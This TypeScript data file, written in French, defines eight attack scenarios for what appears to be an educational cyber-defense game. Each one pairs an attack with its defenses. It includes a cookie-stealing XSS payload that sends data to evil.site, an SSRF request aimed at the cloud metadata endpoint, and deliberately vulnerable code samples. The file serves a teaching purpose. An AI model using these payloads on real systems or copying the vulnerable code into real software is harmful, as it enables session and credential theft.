export type CyberAttackId =
  | 'xss'
  | 'mitm'
  | 'ransomware'
  | 'bruteforce'
  | 'phishing'
  | 'dns'
  | 'ssrf'
  | 'csrf';

export interface AttackDefenseOption {
  id: string;
  name: string;
  layer: string;
  shortEffect: string;
  detail: string;
  impactWeight: number; // 0..1 contribution to neutralizing the attack
  dropTag: string;
}

export interface CyberAttackDefinition {
  id: CyberAttackId;
  shortLabel: string;
  title: string;
  category: string;
  severity: 'Critique' | 'Élevée';
  summary: string;
  mechanism: string;
  payloadPreview: string;
  attackMetricLabel: string;
  attackMetricUnit: string;
  attackRatePerTick: number;
  damageLabel: string;
  safeStatusLabel: string;
  compromisedStatusLabel: string;
  defenses: AttackDefenseOption[];
  configTitle: string;
  vulnerableCode: string;
  hardenedCode: string;
  initialAlert: string;
  resolvedMessage: string;
}

export const CYBER_ATTACK_LIST: CyberAttackDefinition[] = [
  {
    id: 'xss',
    shortLabel: 'XSS & Cookie',
    title: 'Attaque XSS (Cross-Site Scripting) & Vol de Session',
    category: 'Web · OWASP A03',
    severity: 'Élevée',
    summary: 'Injection de JavaScript malveillant dans un commentaire pour exfiltrer le cookie de session des visiteurs.',
    mechanism:
      'Le forum affiche les commentaires avec innerHTML sans échappement. Chaque visiteur qui ouvre la page exécute le script de l’attaquant, qui lit document.cookie et l’envoie vers evil.site.',
    payloadPreview: `<script>fetch("https://evil.site/steal?c="+document.cookie)</script>`,
    attackMetricLabel: 'Sessions exfiltrées',
    attackMetricUnit: 'cookies',
    attackRatePerTick: 3,
    damageLabel: 'Comptes compromis en direct',
    safeStatusLabel: 'DOM SAIN · SCRIPT NEUTRALISÉ',
    compromisedStatusLabel: 'FUITE COOKIE ACTIVE',
    defenses: [
      {
        id: 'escape',
        name: 'Échappement HTML (textContent)',
        layer: 'Frontend · DOM',
        shortEffect: 'Convertit <script> en texte brut inoffensif',
        detail:
          'En remplaçant innerHTML par textContent (ou l’échappement React par défaut), les balises <script> ne sont plus interprétées par le navigateur.',
        impactWeight: 0.45,
        dropTag: 'ESCAPED',
      },
      {
        id: 'httponly',
        name: 'Cookie HttpOnly + SameSite',
        layer: 'HTTP · Session',
        shortEffect: 'Rend le cookie invisible à document.cookie',
        detail:
          'L’attribut HttpOnly empêche tout script JavaScript de lire le jeton de session, coupant net l’exfiltration même en cas de faille XSS.',
        impactWeight: 0.3,
        dropTag: 'HTTPONLY',
      },
      {
        id: 'csp',
        name: 'En-tête CSP (Content-Security-Policy)',
        layer: 'Navigateur · Politique',
        shortEffect: 'Bloque scripts inline et domaines non autorisés',
        detail:
          'La politique CSP interdit les scripts inline non signés et bloque toute requête fetch() sortante vers evil.site.',
        impactWeight: 0.25,
        dropTag: 'CSP BLOCK',
      },
    ],
    configTitle: 'Protection XSS · Code React/JS & En-têtes HTTP',
    vulnerableCode: `// Vulnérable : injection directe dans le DOM
commentBox.innerHTML = userComment;

// Cookie lisible par JavaScript
Set-Cookie: session_id=eyJhbGci...; Path=/`,
    hardenedCode: `// Sécurisé : texte échappé + Cookie HttpOnly + CSP
commentBox.textContent = userComment;

Set-Cookie: session_id=eyJhbGci...; HttpOnly; Secure; SameSite=Strict
Content-Security-Policy: default-src 'self'; script-src 'self'`,
    initialAlert:
      'Script malveillant injecté dans le fil #general : les cookies de session des visiteurs fuient vers evil.site.',
    resolvedMessage:
      'Faille XSS neutralisée : les balises sont échappées, les cookies protégés par HttpOnly et la CSP bloque toute exfiltration.',
  },
  {
    id: 'mitm',
    shortLabel: 'MitM / ARP',
    title: 'Man-in-the-Middle (ARP Spoofing sur Wi-Fi Public)',
    category: 'Réseau · Couche 2/7',
    severity: 'Critique',
    summary: 'Interception silencieuse du trafic sur un Wi-Fi public par usurpation ARP et lecture des identifiants en clair.',
    mechanism:
      'L’attaquant envoie de fausses trames ARP à la victime (« Je suis le routeur ») et au routeur (« Je suis la victime »). Tout le trafic HTTP non chiffré passe par son ordinateur et révèle mots de passe et tokens.',
    payloadPreview: `ARP Reply: 192.168.1.1 is-at DE:AD:BE:EF:00:99 -> POST /login (CLAIR)`,
    attackMetricLabel: 'Paquets interceptés en clair',
    attackMetricUnit: 'trames',
    attackRatePerTick: 14,
    damageLabel: 'Identifiants lus en clair',
    safeStatusLabel: 'TRAFIC CHIFFRÉ · ARP VÉRIFIÉ',
    compromisedStatusLabel: 'ÉCOUTE EN CLAIR ACTIVE',
    defenses: [
      {
        id: 'tls',
        name: 'HTTPS / TLS 1.3 + HSTS',
        layer: 'Couche 6/7 · Chiffrement',
        shortEffect: 'Chiffre bout-en-bout les échanges applicatifs',
        detail:
          'Même si l’attaquant relaie les paquets, le chiffrement TLS 1.3 les rend illisibles et HSTS empêche toute rétrogradation vers HTTP.',
        impactWeight: 0.45,
        dropTag: 'TLS 1.3',
      },
      {
        id: 'vpn',
        name: 'Tunnel VPN Chiffré (WireGuard)',
        layer: 'Couche 3 · Tunnel',
        shortEffect: 'Encapsule tout le trafic Wi-Fi dans un tunnel',
        detail:
          'Le VPN chiffre l’intégralité des paquets IP dès la sortie du poste client, masquant même les domaines visités sur le Wi-Fi public.',
        impactWeight: 0.3,
        dropTag: 'VPN AES',
      },
      {
        id: 'dai',
        name: 'Dynamic ARP Inspection (Switch)',
        layer: 'Couche 2 · Commutateur',
        shortEffect: 'Rejette les trames ARP usurpées sur le LAN',
        detail:
          'Le switch compare chaque réponse ARP à la table DHCP Snooping et jette instantanément les usurpations d’adresse MAC.',
        impactWeight: 0.25,
        dropTag: 'DAI DROP',
      },
    ],
    configTitle: 'Durcissement Anti-MitM · Nginx HSTS & Switch Cisco DAI',
    vulnerableCode: `# Serveur HTTP en clair + Switch sans inspection ARP
server {
    listen 80;
    # Aucun chiffrement TLS ni redirection HTTPS
}`,
    hardenedCode: `# HTTPS obligatoire + HSTS preload
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";

# Switch L2 : activer DHCP Snooping + Dynamic ARP Inspection
ip arp inspection vlan 10`,
    initialAlert:
      'Usurpation ARP détectée sur le Wi-Fi : le trafic HTTP passe par le poste attaquant et expose les mots de passe en clair.',
    resolvedMessage:
      'Interception MitM neutralisée : les trames ARP forgées sont rejetées et les flux sont chiffrés de bout en bout.',
  },
  {
    id: 'ransomware',
    shortLabel: 'Ransomware',
    title: 'Ransomware & Propagation Latérale en Temps Réel',
    category: 'Endpoint · Réseau Interne',
    severity: 'Critique',
    summary: 'Exécution d’une pièce jointe piégée chiffrant les fichiers (.locked) et contaminant les serveurs via SMB.',
    mechanism:
      'Un poste ouvre Facture_2026.pdf.exe. Le chiffreur parcourt les dossiers locaux, vole les identifiants en mémoire puis se propage en quelques secondes aux serveurs voisins par le port SMB (445).',
    payloadPreview: `Encrypting /partage/compta/*.xlsx -> .locked | SMB 445 lateral spread`,
    attackMetricLabel: 'Fichiers chiffrés (.locked)',
    attackMetricUnit: 'fichiers',
    attackRatePerTick: 42,
    damageLabel: 'Propagation latérale active',
    safeStatusLabel: 'CONFINÉ · RESTAURATION OK',
    compromisedStatusLabel: 'CHIFFREMENT EN COURS',
    defenses: [
      {
        id: 'edr',
        name: 'Isolation EDR (Quarantaine VLAN)',
        layer: 'Endpoint · SOC',
        shortEffect: 'Coupe immédiatement le poste infecté du réseau',
        detail:
          'L’agent EDR tue le processus chiffreur et place le poste infecté en quarantaine réseau pour stopper toute contagion.',
        impactWeight: 0.45,
        dropTag: 'ISOLÉ EDR',
      },
      {
        id: 'smb',
        name: 'Micro-segmentation & Blocage SMB',
        layer: 'Réseau · Pare-feu Interne',
        shortEffect: 'Bloque les déplacements latéraux port 445',
        detail:
          'Interdire les flux poste-à-poste sur SMB (TCP 445) et désactiver SMBv1 empêche le ransomware d’atteindre l’Active Directory et les serveurs.',
        impactWeight: 0.3,
        dropTag: 'SMB DROP',
      },
      {
        id: 'backup',
        name: 'Sauvegarde Immuable (Règle 3-2-1)',
        layer: 'Stockage · PRA',
        shortEffect: 'Restaure les données saines sans payer de rançon',
        detail:
          'Des snapshots WORM (Write Once Read Many) hors-ligne ne peuvent pas être chiffrés par l’attaquant et permettent une reprise rapide.',
        impactWeight: 0.25,
        dropTag: 'RESTORE 3-2-1',
      },
    ],
    configTitle: 'Défense Ransomware · Politique SMB & Sauvegarde Immuable',
    vulnerableCode: `# Partages ouverts entre tous les postes + backups sur le même disque
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
# Aucun EDR ni segmentation entre postes clients et serveurs`,
    hardenedCode: `# 1. Désactiver SMBv1 et bloquer SMB latéral (TCP 445)
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
New-NetFirewallRule -DisplayName "Block Lateral SMB" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Block
# 2. Backup immuable (Object Lock WORM) + isolation EDR`,
    initialAlert:
      'Alerte critique : chiffrement massif (.locked) détecté sur Poste-RH-04 et tentative de propagation SMB vers Serveur-Fichiers !',
    resolvedMessage:
      'Ransomware contenu : le poste infecté est isolé, SMB latéral est coupé et les fichiers sont restaurés depuis le backup immuable.',
  },
  {
    id: 'bruteforce',
    shortLabel: 'Force Brute',
    title: 'Force Brute & Credential Stuffing sur Connexion',
    category: 'Identité · OWASP A07',
    severity: 'Élevée',
    summary: 'Tests automatisés à haute vitesse de milliers de couples email/mot de passe issus de fuites publiques.',
    mechanism:
      'Un script envoie des centaines de requêtes POST /api/login par seconde en testant des listes de mots de passe réutilisés. Sans limite ni MFA, les comptes faibles tombent rapidement.',
    payloadPreview: `POST /api/login -> admin@cyberland.app : Summer2024! (480 essais/s)`,
    attackMetricLabel: 'Tentatives testées',
    attackMetricUnit: 'essais',
    attackRatePerTick: 185,
    damageLabel: 'Risque de compromission admin',
    safeStatusLabel: 'AUTHENTIFICATION PROTÉGÉE',
    compromisedStatusLabel: 'RAFALE DE CONNEXIONS',
    defenses: [
      {
        id: 'lockout',
        name: 'Rate Limit & Verrouillage progressif',
        layer: 'API · Auth',
        shortEffect: 'Plafonne à 5 échecs puis temporise (HTTP 429)',
        detail:
          'Après 5 tentatives ratées, l’IP et le compte subissent un délai exponentiel (backoff), rendant la force brute impraticable.',
        impactWeight: 0.35,
        dropTag: 'HTTP 429',
      },
      {
        id: 'mfa',
        name: 'MFA Obligatoire (TOTP / FIDO2)',
        layer: 'Identité · 2e Facteur',
        shortEffect: 'Bloque l’accès même avec un mot de passe volé',
        detail:
          'Même si l’attaquant devine le bon mot de passe, la connexion échoue sans le code temporaire TOTP ou la clé physique.',
        impactWeight: 0.45,
        dropTag: 'MFA BLOCK',
      },
      {
        id: 'argon2',
        name: 'Hachage Lent Argon2id + Mots de passe forts',
        layer: 'Base de données · Crypto',
        shortEffect: 'Ralentit le cassage et interdit les fuites connues',
        detail:
          'Argon2id consomme mémoire et CPU à chaque vérification et rejette les mots de passe présents dans les bases de fuites.',
        impactWeight: 0.2,
        dropTag: 'ARGON2ID',
      },
    ],
    configTitle: 'Sécurisation Connexion · Rate Limit + MFA + Argon2id',
    vulnerableCode: `// Vulnérable : aucune limite d'essais, MD5 rapide, sans MFA
app.post('/api/login', async (req, res) => {
  const ok = md5(req.body.password) === user.passwordHash;
  if (ok) return res.json({ token: signJwt(user) });
});`,
    hardenedCode: `// Sécurisé : Rate Limit (5 essais/15min) + Argon2id + MFA obligatoire
app.post('/api/login', loginRateLimiter, async (req, res) => {
  const ok = await argon2.verify(user.passwordHash, req.body.password);
  if (!ok || !verifyTotp(user.mfaSecret, req.body.otp)) {
    return res.status(401).json({ error: 'Accès refusé' });
  }
  return res.json({ token: signJwt(user) });
});`,
    initialAlert:
      'Rafale de Credential Stuffing en cours sur /api/login : 480 tentatives/seconde depuis des proxys résidentiels.',
    resolvedMessage:
      'Force brute stoppée : le verrouillage bloque les rafales en HTTP 429 et le MFA protège chaque compte même en cas de fuite.',
  },
  {
    id: 'phishing',
    shortLabel: 'Phishing / AiTM',
    title: 'Phishing & Détournement de Session (Proxy AiTM)',
    category: 'Ingénierie Sociale · Mail',
    severity: 'Critique',
    summary: 'Usurpation d’e-mail interne renvoyant vers un faux portail SSO qui vole mot de passe et cookie de session.',
    mechanism:
      'L’attaquant usurpe security@cyberland.app et incite un employé à cliquer sur login-cyber1and.com. Ce proxy Adversary-in-the-Middle relaie même un code SMS/OTP pour dérober le cookie de session.',
    payloadPreview: `From: security@cyberland.app (SPF FAIL) -> https://login-cyber1and.com`,
    attackMetricLabel: 'E-mails piégés délivrés',
    attackMetricUnit: 'mails',
    attackRatePerTick: 6,
    damageLabel: 'Jetons SSO détournés',
    safeStatusLabel: 'DOMAINE AUTHENTIFIÉ · ANTI-AITM',
    compromisedStatusLabel: 'CAMPAGNE PHISHING ACTIVE',
    defenses: [
      {
        id: 'dmarc',
        name: 'SPF + DKIM + DMARC (p=reject)',
        layer: 'Messagerie · DNS',
        shortEffect: 'Rejette automatiquement les e-mails usurpés',
        detail:
          'Les serveurs de messagerie vérifient la signature cryptographique DKIM et l’IP SPF ; tout mail usurpant cyberland.app est rejeté avant la boîte de réception.',
        impactWeight: 0.45,
        dropTag: 'DMARC 550',
      },
      {
        id: 'fido2',
        name: 'Authentification FIDO2 / Passkey',
        layer: 'Identité · WebAuthn',
        shortEffect: 'Résiste au phishing AiTM en liant le domaine TLS',
        detail:
          'Une clé Passkey/FIDO2 vérifie cryptographiquement le vrai domaine cyberland.app et refuse de signer sur le faux site login-cyber1and.com.',
        impactWeight: 0.35,
        dropTag: 'FIDO2 DENY',
      },
      {
        id: 'filter',
        name: 'Filtre Liens & Sandbox Pièces Jointes',
        layer: 'Passerelle · Email Security',
        shortEffect: 'Bloque les domaines typosquattés récemment créés',
        detail:
          'La passerelle analyse la réputation des URL et détonne les pièces jointes suspectes en environnement isolé avant livraison.',
        impactWeight: 0.2,
        dropTag: 'URL BLOCK',
      },
    ],
    configTitle: 'Authentification Mail · Enregistrements DNS SPF & DMARC',
    vulnerableCode: `; Domaine sans protection DMARC (usurpation libre)
cyberland.app.  TXT  "v=spf1 ~all"
; Aucun enregistrement _dmarc -> les faux mails arrivent en boîte principale`,
    hardenedCode: `; Protection stricte contre l'usurpation de domaine
cyberland.app.        TXT  "v=spf1 include:_spf.mail.cyberland.app -all"
_dmarc.cyberland.app. TXT  "v=DMARC1; p=reject; sp=reject; adkim=s; aspf=s;"
; + Connexion SSO par Passkey / FIDO2 (insensible aux proxys AiTM)`,
    initialAlert:
      'Campagne de phishing détectée : faux e-mails « Mot de passe expiré » usurpant cyberland.app vers le proxy AiTM login-cyber1and.com.',
    resolvedMessage:
      'Campagne neutralisée : DMARC p=reject bloque les usurpations en amont et les Passkeys FIDO2 rendent le faux portail inutilisable.',
  },
  {
    id: 'dns',
    shortLabel: 'DNS Spoofing',
    title: 'Empoisonnement DNS (Cache Poisoning / Spoofing)',
    category: 'Infrastructure · UDP 53',
    severity: 'Critique',
    summary: 'Injection de faux enregistrements A dans le cache DNS pour rediriger les utilisateurs vers un site cloné.',
    mechanism:
      'Un attaquant inonde un résolveur DNS non sécurisé de fausses réponses UDP 53 avant le vrai serveur autoritaire. Le cache mémorise banque.cyberland.app -> 185.22.9.66 (serveur pirate) pour tous les clients.',
    payloadPreview: `DNS Reply Forged: banque.cyberland.app A -> 185.22.9.66 (TTL 86400)`,
    attackMetricLabel: 'Clients redirigés vers le clone',
    attackMetricUnit: 'requêtes',
    attackRatePerTick: 19,
    damageLabel: 'Cache DNS empoisonné',
    safeStatusLabel: 'DNSSEC VALIDÉ · RÉSOLUTION SÛRE',
    compromisedStatusLabel: 'REDIRECTION MALVEILLANTE',
    defenses: [
      {
        id: 'dnssec',
        name: 'Validation DNSSEC (Signatures RRSIG)',
        layer: 'DNS · Cryptographie',
        shortEffect: 'Vérifie la signature cryptographique de chaque IP',
        detail:
          'Chaque réponse DNS est signée par la clé privée du domaine. Les fausses réponses forgées sans signature valide sont rejetées (SERVFAIL).',
        impactWeight: 0.5,
        dropTag: 'BOGUS SIG',
      },
      {
        id: 'doh',
        name: 'DNS over HTTPS / TLS (DoH / DoT)',
        layer: 'Transport · Chiffrement',
        shortEffect: 'Chiffre les requêtes DNS entre client et résolveur',
        detail:
          'Remplacer UDP 53 en clair par DoH (HTTPS 443) empêche tout attaquant réseau d’espionner ou modifier les réponses DNS en transit.',
        impactWeight: 0.3,
        dropTag: 'DOH TLS',
      },
      {
        id: 'randomize',
        name: 'Randomisation Port Source & TXID',
        layer: 'Résolveur · Durcissement',
        shortEffect: 'Rend l’usurpation de réponse statistiquement impossible',
        detail:
          'Varier aléatoirement le port source UDP et l’identifiant de transaction (0x20 bit encoding) empêche l’attaquant de deviner la requête.',
        impactWeight: 0.2,
        dropTag: 'TXID OK',
      },
    ],
    configTitle: 'Résolveur Unbound / BIND · Activation DNSSEC & DoT/DoH',
    vulnerableCode: `# Résolveur DNS classique en clair sans validation cryptographique
server:
    dnssec-validation: no
    # Réponses UDP 53 acceptées sans vérification de signature`,
    hardenedCode: `# Résolveur durci : DNSSEC strict + chiffrement DoT/DoH
server:
    auto-trust-anchor-file: "/var/lib/unbound/root.key"
    harden-dnssec-stripped: yes
    use-caps-for-id: yes
    tls-upstream: yes`,
    initialAlert:
      'Cache DNS empoisonné : banque.cyberland.app résout vers 185.22.9.66 (serveur attaquant) au lieu de 104.21.44.12 !',
    resolvedMessage:
      'Résolution DNS assainie : DNSSEC rejette les réponses non signées et DoH chiffre les échanges vers la vraie IP 104.21.44.12.',
  },
  {
    id: 'ssrf',
    shortLabel: 'SSRF Cloud',
    title: 'SSRF (Server-Side Request Forgery) sur le Cloud',
    category: 'Cloud · OWASP A10',
    severity: 'Critique',
    summary: 'Détournement d’une fonction d’aperçu d’URL pour piller le service interne de métadonnées IAM (169.254.169.254).',
    mechanism:
      'L’API /api/preview récupère n’importe quelle URL saisie par l’utilisateur. L’attaquant fournit l’IP interne Cloud 169.254.169.254 pour forcer le serveur à lire ses propres clés temporaires IAM et les lui renvoyer.',
    payloadPreview: `GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/`,
    attackMetricLabel: 'Secrets Cloud exfiltrés',
    attackMetricUnit: 'jetons',
    attackRatePerTick: 2,
    damageLabel: 'Clés IAM exposées',
    safeStatusLabel: 'VPC CLOISONNÉ · IMDSV2 ACTIF',
    compromisedStatusLabel: 'FUITE MÉTADONNÉES CLOUD',
    defenses: [
      {
        id: 'allowlist',
        name: 'Liste blanche & Blocage IP Privées',
        layer: 'Backend · Validation URL',
        shortEffect: 'Interdit 169.254.0.0/16, 10.0.0.0/8 et localhost',
        detail:
          'Résoudre le DNS puis bloquer toutes les plages RFC1918 / link-local empêche le serveur d’atteindre le réseau interne du VPC.',
        impactWeight: 0.45,
        dropTag: 'CIDR BLOCK',
      },
      {
        id: 'imdsv2',
        name: 'Imposer IMDSv2 (Token PUT obligatoire)',
        layer: 'Cloud · Métadonnées VM',
        shortEffect: 'Exige un jeton de session via en-tête spécifique',
        detail:
          'Contrairement à IMDSv1, IMDSv2 exige une requête PUT préalable avec l’en-tête X-aws-ec2-metadata-token-ttl-seconds, bloquant les SSRF GET simples.',
        impactWeight: 0.35,
        dropTag: 'IMDSV2 401',
      },
      {
        id: 'egress',
        name: 'Pare-feu Egress & Moindre Privilège IAM',
        layer: 'Cloud · IAM / Réseau',
        shortEffect: 'Limite les sorties réseau et les droits de la VM',
        detail:
          'Restreindre le rôle IAM de la VM au strict minimum et filtrer les flux sortants réduit drastiquement l’impact de toute faille.',
        impactWeight: 0.2,
        dropTag: 'EGRESS DENY',
      },
    ],
    configTitle: 'Protection SSRF · Validation IP & IMDSv2 Cloud',
    vulnerableCode: `// Vulnérable : le serveur fetch n'importe quelle URL interne
app.get('/api/preview', async (req, res) => {
  const response = await fetch(req.query.url); // atteint 169.254.169.254 !
  res.send(await response.text());
});`,
    hardenedCode: `// Sécurisé : blocage CIDR privés + IMDSv2 requis sur la VM
const ip = await resolveDnsStrict(url.hostname);
if (isPrivateOrLinkLocalIp(ip)) {
  return res.status(403).json({ error: 'Cible interne interdite' });
}
// + aws ec2 modify-instance-metadata-options --http-tokens required`,
    initialAlert:
      'Alerte Cloud : le serveur web interroge 169.254.169.254 via /api/preview et expose les jetons IAM de la VM !',
    resolvedMessage:
      'Faille SSRF colmatée : les IP internes/link-local sont bloquées et IMDSv2 refuse les accès non authentifiés.',
  },
  {
    id: 'csrf',
    shortLabel: 'Attaque CSRF',
    title: 'CSRF (Cross-Site Request Forgery) · Virement Forcé',
    category: 'Web · Session',
    severity: 'Élevée',
    summary: 'Un site piège déclenche à l’insu de la victime un virement bancaire en exploitant son cookie de session actif.',
    mechanism:
      'La victime reste connectée à banque.cyberland.app dans un onglet et ouvre promo-cadeau.site dans un autre. Un formulaire invisible soumet POST /api/virement ; le navigateur joint automatiquement le cookie de session.',
    payloadPreview: `<form action="https://banque.cyberland.app/api/virement" method="POST">...`,
    attackMetricLabel: 'Montant détourné',
    attackMetricUnit: '€',
    attackRatePerTick: 250,
    damageLabel: 'Virements forgés exécutés',
    safeStatusLabel: 'ORIGINE VÉRIFIÉE · CSRF BLOQUÉ',
    compromisedStatusLabel: 'VIREMENTS NON AUTORISÉS',
    defenses: [
      {
        id: 'token',
        name: 'Jeton Anti-CSRF Unique par Requête',
        layer: 'Backend · Formulaire',
        shortEffect: 'Exige un secret imprévisible absent du site tiers',
        detail:
          'Le serveur génère un jeton aléatoire lié à la session. Le site piège ne pouvant lire la page bancaire (Same-Origin Policy), sa requête échoue en HTTP 403.',
        impactWeight: 0.45,
        dropTag: '403 TOKEN',
      },
      {
        id: 'samesite',
        name: 'Cookie SameSite=Strict',
        layer: 'HTTP · Navigateur',
        shortEffect: 'Empêche l’envoi du cookie depuis un site externe',
        detail:
          'Avec SameSite=Strict, le navigateur n’attache jamais le cookie de session lors d’une requête initiée depuis promo-cadeau.site.',
        impactWeight: 0.35,
        dropTag: 'SAMESITE',
      },
      {
        id: 'origin',
        name: 'Vérification En-têtes Origin / Re-auth',
        layer: 'API · Contrôle d’accès',
        shortEffect: 'Rejette les en-têtes Origin étrangers sur actions critiques',
        detail:
          'Le backend contrôle l’en-tête Origin et demande une confirmation forte pour les opérations financières sensibles.',
        impactWeight: 0.2,
        dropTag: 'ORIGIN 403',
      },
    ],
    configTitle: 'Protection CSRF · Cookie SameSite & Vérification Jeton',
    vulnerableCode: `// Vulnérable : accepte tout POST avec le cookie seul
Set-Cookie: bank_session=abc123; Path=/
app.post('/api/virement', requireSessionCookie, transferFunds);`,
    hardenedCode: `// Sécurisé : SameSite=Strict + Jeton Anti-CSRF obligatoire
Set-Cookie: bank_session=abc123; HttpOnly; Secure; SameSite=Strict

app.post('/api/virement', requireSessionCookie, verifyCsrfToken, verifyOrigin, transferFunds);`,
    initialAlert:
      'Requête suspecte détectée : promo-cadeau.site déclenche des virements POST /api/virement avec le cookie de la victime !',
    resolvedMessage:
      'Attaque CSRF neutralisée : le cookie SameSite=Strict n’est plus envoyé depuis un site tiers et les jetons invalides sont rejetés (403).',
  },
];

export const CYBER_ATTACK_MAP: Record<CyberAttackId, CyberAttackDefinition> = CYBER_ATTACK_LIST.reduce(
  (acc, item) => {
    acc[item.id] = item;
    return acc;
  },
  {} as Record<CyberAttackId, CyberAttackDefinition>
);
